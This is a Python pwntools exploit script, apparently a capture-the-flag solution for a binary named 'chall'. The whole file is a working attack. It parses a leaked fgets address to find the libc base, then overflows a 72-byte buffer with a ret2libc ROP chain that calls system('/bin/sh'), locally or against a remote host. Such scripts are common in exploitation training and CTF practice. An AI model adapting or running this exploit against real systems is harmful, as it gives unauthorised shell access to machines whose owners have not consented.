from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DBG:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
libc = ELF('libc6_2.35-0ubuntu3_amd64.so')
io = start()
offset = 72
io.recvuntil(b'ups leak! ')
fgets_leak = int("0x" + io.recvline().strip().decode(),16)
info(f"Fgets leak : {hex(fgets_leak)}")
libc.address = fgets_leak - libc.sym['fgets']
pop_rdi = libc.address + 0x2a3e5
info(f"Libc address : {hex(libc.address)}")
payload = flat({offset: [pop_rdi+1, # ret for stack alignment
                         pop_rdi,
                         next(libc.search(b'/bin/sh\x00')),
                         libc.sym['system']
                         ]})

io.sendline(payload)
io.interactive()
